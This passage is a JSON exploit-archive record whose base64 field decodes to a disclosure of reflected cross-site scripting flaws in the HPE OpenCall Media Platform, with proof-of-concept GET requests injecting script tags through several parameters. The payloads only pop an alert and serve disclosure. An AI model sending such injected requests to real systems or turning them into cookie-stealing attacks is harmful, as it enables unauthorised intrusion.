EVWX05VTT0wJkxFVl9OQU1FMD1OMCZMRVZfTkFNRTE9TjEmTEVWX05BTUUyPU4yJkxFVl9OQU1FMz1OMzBjNGI4Ij48c2NyaXB0PmFsZXJ0KDEpPCUyZnNjcmlwdD5jMTBiMiZMRVZfVFlQRTA9VDAmTEVWX1RZUEUxPVQxJkxFVl9UWVBFMj1UMiZMRVZfVFlQRTM9VDMNCkhUVFAvMS4xDQpIb3N0OiAxNzIuMjcuMTE2LjQwOjQ0NDMNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IHJ2OjQwLjApDQpHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQwLjANCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkROVDogMQ0KUmVmZXJlcjogaHR0cHM6Ly8xNzIuMjcuMTE2LjQwOjQ0NDMvT0NNUE9BTS9CTVBGRmF1bHRNZ3IuY2hhaWxldA0KQ29va2llOiBKU0VTU0lPTklEPTRGOTlDMjc1MjVCRkRCNDRENDZFM0ExMDlGQTQ5REFDDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNClBsYXRmb3JtIEFkbWluaXN0cmF0aW9uIFRvb2wg4oCTIEdldE1hcEFjdGlvbiBmdW5jdGlvbg0KDQpIUEUgT3BlbkNhbGwgTWVkaWEgUGxhdGZvcm0gKE9DTVApIGRvZXMgbm90IHNhbml0aXplIEdldE1hcEFjdGlvbg0KZnVuY3Rpb24gaW5wdXQuIEFuIGF0dGFja2VyIGNhbiBpbmplY3QgbWFsaWNpb3VzIEphdmEgc2NyaXB0IHRvDQp0cmlnZ2VyIHRoZSBSZWZsZWN0ZWQgQ3Jvc3MtU2l0ZSBTY3JpcHRpbmcgKFhTUykuDQoNClRoZSB2dWxuZXJhYmxlIFVSTDoNCi9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0P0dldE1hcEFjdGlvbj1IVE1MYWVjNWHigJ0+PHNjcmlwdD5hbGVydCgxKTwNCiUyZnNjcmlwdD43MDczMyZMRVZFTD1UT1BfTEVWRUwmVFlQRT0xJk5BTUU9Um9vdCZEQVRFPTAmTEVWX05VTT0wJkxFVl9OQU1FMD1OMCZMRVZfTkFNRTE9TjEmTEVWX05BTUUyPU4yJkxFVl9OQU1FMz1OMyZMRVZfVFlQRTA9VDAmTEVWX1RZUEUxPVQxJkxFVl9UWVBFMj1UMiZMRVZfVFlQRTM9VDMNCg0KUHJvb2Ygb2YgQ29uY2VwdA0KDQpBbiBBdHRhY2tlciBzZW5kIHRoZSBmb2xsb3dpbmcgR0VUIHJlcXVlc3QgdG8gdGhlIHZpY3RpbXMgbWFjaGluZToNCg0KR0VUIC9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0P0dldE1hcEFjdGlvbj1IVE1MYWVjNWEiPjxzY3JpcHQ+YWxlcnQoMSk8JTJmc2NyaXB0PjcwNzMzJkxFVkVMPVRPUF9MRVZFTCZUWVBFPTEmTkFNRT1Sb290JkRBVEU9MCZMRVZfTlVNPTAmTEVWX05BTUUwPU4wJkxFVl9OQU1FMT1OMSZMRVZfTkFNRTI9TjImTEVWX05BTUUzPU4zJkxFVl9UWVBFMD1UMCZMRVZfVFlQRTE9VDEmTEVWX1RZUEUyPVQyJkxFVl9UWVBFMz1UMw0KSFRUUC8xLjENCkhvc3Q6IDE3Mi4yNy4xMTYuNDA6NDQ0Mw0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgcnY6NDAuMCkNCkdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNDAuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KRE5UOiAxDQpSZWZlcmVyOiBodHRwczovLzE3Mi4yNy4xMTYuNDA6NDQ0My9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0DQpDb29raWU6IEpTRVNTSU9OSUQ9NEY5OUMyNzUyNUJGREI0NEQ0NkUzQTEwOUZBNDlEQUMNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0KUGxhdGZvcm0gQWRtaW5pc3RyYXRpb24gVG9vbCDigJMgTEVWX05VTSBwYXJhbWV0ZXINCg0KSFBFIE9wZW5DYWxsIE1lZGlhIFBsYXRmb3JtIChPQ01QKSBkb2VzIG5vdCBzYW5pdGl6ZSBHZXRNYXBBY3Rpb24NCmZ1bmN0aW9uIHBhcmFtZXRlciBMRVZfTlVNIGlucHV0LiBBbiBhdHRhY2tlciBjYW4gaW5qZWN0IG1hbGljaW91cw0KSmF2YSBzY3JpcHQgdG8gdHJpZ2dlciB0aGUgUmVmbGVjdGVkIENyb3NzLVNpdGUgU2NyaXB0aW5nIChYU1MpLg0KDQpUaGUgdnVsbmVyYWJsZSBVUkw6DQovT0NNUE9BTS9CTVBGRmF1bHRNZ3IuY2hhaWxldD9HZXRNYXBBY3Rpb249SFRNTCZMRVZFTD1UT1BfTEVWRUwmVFlQRT0xJk5BTUU9Um9vdCZEQVRFPTAmTEVWX05VTT0wMGI5NmTigJ0+PHNjcmlwdD5hbGVydCgxKTwNCiUyZnNjcmlwdD41ODQwMCZMRVZfTkFNRTA9TjAmTEVWX05BTUUxPU4xJkxFVl9OQU1FMj1OMiZMRVZfTkFNRTM9TjMmTEVWX1RZUEUwPVQwJkxFVl9UWVBFMT1UMSZMRVZfVFlQRTI9VDImTEVWX1RZUEUzPVQzDQoNClByb29mIG9mIENvbmNlcHQNCg0KQW4gQXR0YWNrZXIgc2VuZCB0aGUgZm9sbG93aW5nIEdFVCByZXF1ZXN0IHRvIHRoZSB2aWN0aW1zIG1hY2hpbmU6DQoNCkdFVCAvT0NNUE9BTS9CTVBGRmF1bHRNZ3IuY2hhaWxldD9HZXRNYXBBY3Rpb249SFRNTCZMRVZFTD1UT1BfTEVWRUwmVFlQRT0xJk5BTUU9Um9vdCZEQVRFPTAmTEVWX05VTT0wMGI5NmQiPjxzY3JpcHQ+YWxlcnQoMSk8JTJmc2NyaXB0PjU4NDAwJkxFVl9OQU1FMD1OMCZMRVZfTkFNRTE9TjEmTEVWX05BTUUyPU4yJkxFVl9OQU1FMz1OMyZMRVZfVFlQRTA9VDAmTEVWX1RZUEUxPVQxJkxFVl9UWVBFMj1UMiZMRVZfVFlQRTM9VDMNCkhUVFAvMS4xDQpIb3N0OiAxNzIuMjcuMTE2LjQwOjQ0NDMNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IHJ2OjQwLjApDQpHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQwLjANCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkROVDogMQ0KUmVmZXJlcjogaHR0cHM6Ly8xNzIuMjcuMTE2LjQwOjQ0NDMvT0NNUE9BTS9CTVBGRmF1bHRNZ3IuY2hhaWxldA0KQ29va2llOiBKU0VTU0lPTklEPTRGOTlDMjc1MjVCRkRCNDRENDZFM0ExMDlGQTQ5REFDDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNClBsYXRmb3JtIEFkbWluaXN0cmF0aW9uIFRvb2wg4oCTIE5BTUUgcGFyYW1ldGVyDQoNCkhQRSBPcGVuQ2FsbCBNZWRpYSBQbGF0Zm9ybSAoT0NNUCkgZG9lcyBub3Qgc2FuaXRpemUgR2V0TWFwQWN0aW9uDQpmdW5jdGlvbiBwYXJhbWV0ZXIgTkFNRSBpbnB1dC4gQW4gYXR0YWNrZXIgY2FuIGluamVjdCBtYWxpY2lvdXMgSmF2YQ0Kc2NyaXB0IHRvIHRyaWdnZXIgdGhlIFJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKS4NCg0KVGhlIHZ1bG5lcmFibGUgVVJMOg0KL09DTVBPQU0vQk1QRkZhdWx0TWdyLmNoYWlsZXQ/R2V0TWFwQWN0aW9uPUhUTUwmTEVWRUw9VE9QX0xFVkVMJlRZUEU9MSZOQU1FPVJvb3Q4YzBkMOKAsz48c2NyaXB0PmFsZXJ0KDEpPA0KJTJmc2NyaXB0PmI4MTFhJkRBVEU9MCZMRVZfTlVNPTAmTEVWX05BTUUwPU4wJkxFVl9OQU1FMT1OMSZMRVZfTkFNRTI9TjImTEVWX05BTUUzPU4zJkxFVl9UWVBFMD1UMCZMRVZfVFlQRTE9VDEmTEVWX1RZUEUyPVQyJkxFVl9UWVBFMz1UMw0KDQpQcm9vZiBvZiBDb25jZXB0DQoNCkFuIEF0dGFja2VyIHNlbmQgdGhlIGZvbGxvd2luZyBHRVQgcmVxdWVzdCB0byB0aGUgdmljdGltcyBtYWNoaW5lOg0KDQpHRVQgL09DTVBPQU0vQk1QRkZhdWx0TWdyLmNoYWlsZXQ/R2V0TWFwQWN0aW9uPUhUTUwmTEVWRUw9VE9QX0xFVkVMJlRZUEU9MSZOQU1FPVJvb3Q4YzBkMCI+PHNjcmlwdD5hbGVydCgxKTwlMmZzY3JpcHQ+YjgxMWEmREFURT0wJkxFVl9OVU09MCZMRVZfTkFNRTA9TjAmTEVWX05BTUUxPU4xJkxFVl9OQU1FMj1OMiZMRVZfTkFNRTM9TjMmTEVWX1RZUEUwPVQwJkxFVl9UWVBFMT1UMSZMRVZfVFlQRTI9VDImTEVWX1RZUEUzPVQzDQpIVFRQLzEuMQ0KSG9zdDogMTcyLjI3LjExNi40MDo0NDQzDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBydjo0MC4wKQ0KR2Vja28vMjAxMDAxMDEgRmlyZWZveC80MC4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpETlQ6IDENClJlZmVyZXI6IGh0dHBzOi8vMTcyLjI3LjExNi40MDo0NDQzL09DTVBPQU0vQk1QRkZhdWx0TWdyLmNoYWlsZXQNCkNvb2tpZTogSlNFU1NJT05JRD00Rjk5QzI3NTI1QkZEQjQ0RDQ2RTNBMTA5RkE0OURBQw0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQpQbGF0Zm9ybSBBZG1pbmlzdHJhdGlvbiBUb29sIOKAkyBuZXh0IHBhcmFtZXRlcg0KDQpIUEUgT3BlbkNhbGwgTWVkaWEgUGxhdGZvcm0gKE9DTVApIGRvZXMgbm90IHNhbml0aXplIGNkcmRpc3BhdGNoDQpmdW5jdGlvbiBwYXJhbWV0ZXIgbmV4dCBpbnB1dC4gQW4gYXR0YWNrZXIgY2FuIGluamVjdCBtYWxpY2lvdXMgSmF2YQ0Kc2NyaXB0IHRvIHRyaWdnZXIgdGhlIFJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKS4NCg0KVGhlIHZ1bG5lcmFibGUgVVJMOiBHRVQNCi9PQ01QT0FNL2NkcmRpc3BhdGNoP3Nlc3Npb25UeXBlPUFDVElWRSZjbWQ9Vmlld0FjdGl2ZUNhbGxzJm5leHQ9RGlzcGxheUJhc2VDZHJCcm93c2VQYWdlYTkwOGY8c2NyaXB0PmFsZXJ0KDEpPA0KJTJmc2NyaXB0PjJmNmJmYTQwYjNkJkNhbGxTZXNzaW9uTGlzdD1BQ1RJVkUNCg0KUHJvb2Ygb2YgQ29uY2VwdA0KDQpBbiBBdHRhY2tlciBzZW5kIHRoZSBmb2xsb3dpbmcgR0VUIHJlcXVlc3QgdG8gdGhlIHZpY3RpbXMgbWFjaGluZToNCg0KR0VUIC9PQ01QT0FNL2NkcmRpc3BhdGNoP3Nlc3Npb25UeXBlPUFDVElWRSZjbWQ9Vmlld0FjdGl2ZUNhbGxzJm5leHQ9RGlzcGxheUJhc2VDZHJCcm93c2VQYWdlYTkwOGY8c2NyaXB0PmFsZXJ0KDEpPCUyZnNjcmlwdD4yZjZiZmE0MGIzZCZDYWxsU2Vzc2lvbkxpc3Q9QUNUSVZFDQpIVFRQLzEuMQ0KSG9zdDogMTcyLjI3LjExNi40MDo0NDQzDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBydjo0MC4wKQ0KR2Vja28vMjAxMDAxMDEgRmlyZWZveC80MC4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpETlQ6IDENClJlZmVyZXI6IGh0dHBzOi8vMTcyLjI3LjExNi40MDo0NDQzL09DTVBPQU0vY2RyZGlzcGF0Y2g/Y21kPURpc3BsYXlCYXNlQ2RyQnJvd3NlUGFnZSZzZXNzaW9uVHlwZT1OT05FDQpDb29raWU6IEpTRVNTSU9OSUQ9NEY5OUMyNzUyNUJGREI0NEQ0NkUzQTEwOUZBNDlEQUMNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0KUGxhdGZvcm0gQWRtaW5pc3RyYXRpb24gVG9vbCDigJMgbmV4dCBwYXJhbWV0ZXINCg0KSFBFIE9wZW5DYWxsIE1lZGlhIFBsYXRmb3JtIChPQ01QKSBkb2VzIG5vdCBzYW5pdGl6ZSBjZHJkaXNwYXRjaA0KZnVuY3Rpb24gcGFyYW1ldGVyIHNlc3Npb25UeXBlIGlucHV0LiBBbiBhdHRhY2tlciBjYW4gaW5qZWN0IG1hbGljaW91cw0KSmF2YSBzY3JpcHQgdG8gdHJpZ2dlciB0aGUgUmVmbGVjdGVkIENyb3NzLVNpdGUgU2NyaXB0aW5nIChYU1MpLg0KDQpUaGUgdnVsbmVyYWJsZSBVUkw6DQovT0NNUE9BTS9jZHJkaXNwYXRjaD9zZXNzaW9uVHlwZT0yNWVkNuKAsz48c2NyaXB0PmFsZXJ0KDEpPA0KJTJmc2NyaXB0PjFiNjA0ZmE3M2YzJmNtZD1WaWV3QWN0aXZlQ2FsbHMmbmV4dD1EaXNwbGF5QmFzZUNkckJyb3dzZVBhZ2UmQ2FsbFNlc3Npb25MaXN0PUFDVElWRQ0KDQpQcm9vZiBvZiBDb25jZXB0DQoNCkFuIEF0dGFja2VyIHNlbmQgdGhlIGZvbGxvd2luZyBHRVQgcmVxdWVzdCB0byB0aGUgdmljdGltcyBtYWNoaW5lOg0KDQpHRVQgL09DTVBPQU0vY2RyZGlzcGF0Y2g/c2Vzc2lvblR5cGU9MjVlZDYiPjxzY3JpcHQ+YWxlcnQoMSk8JTJmc2NyaXB0PjFiNjA0ZmE3M2YzJmNtZD1WaWV3QWN0aXZlQ2FsbHMmbmV4dD1EaXNwbGF5QmFzZUNkckJyb3dzZVBhZ2UmQ2FsbFNlc3Npb25MaXN0PUFDVElWRQ0KSFRUUC8xLjENCkhvc3Q6IDE3Mi4yNy4xMTYuNDA6NDQ0Mw0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgcnY6NDAuMCkNCkdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNDAuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KRE5UOiAxDQpSZWZlcmVyOiBodHRwczovLzE3Mi4yNy4xMTYuNDA6NDQ0My9PQ01QT0FNL2NkcmRpc3BhdGNoP2NtZD1EaXNwbGF5QmFzZUNkckJyb3dzZVBhZ2Umc2Vzc2lvblR5cGU9Tk9ORQ0KQ29va2llOiBKU0VTU0lPTklEPTRGOTlDMjc1MjVCRkRCNDRENDZFM0ExMDlGQTQ5REFDDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCkNWReKAmXMNCg0KQ1ZFLTIwMTctNTc5OSDigJMgUmVtb3RlIENvZGUgRXhlY3V0aW9uDQpDVkUtMjAxNy01Nzk4IOKAkyBSZWZsZWN0ZWQgQ3Jvc3MtU2l0ZSBTY3JpcHRpbmcgKFhTUyk=", 
    "filename": "platforms/multiple/webapps/41927.txt", 
    "id": "41927", 
    "cves": [
        "CVE-2017-5798", 
        "CVE-2017-5799"
    ]
}